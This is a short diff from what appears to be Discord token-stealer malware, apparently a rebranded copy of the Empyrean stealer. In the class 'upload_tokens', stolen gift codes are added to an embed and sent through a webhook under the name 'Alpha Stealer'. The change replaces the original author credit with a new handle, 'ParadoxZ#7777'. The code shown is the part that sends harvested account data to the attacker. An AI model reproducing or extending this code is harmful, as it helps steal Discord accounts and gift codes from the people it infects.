@@ -676,6 +676,6 @@ class upload_tokens:
                 embed.add_field(name="<a:gift:1021608479808569435> Gift Codes:", value=codes, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
 
-            embed.set_footer(text="github.com/addi00000/empyrean")
+            embed.set_footer(text="ParadoxZ#7777")
 
             self.webhook.send(embed=embed, username="Alpha Stealer", avatar_url="https://media.discordapp.net/attachments/1071150917304471693/1071151692940316683/standard.gif")
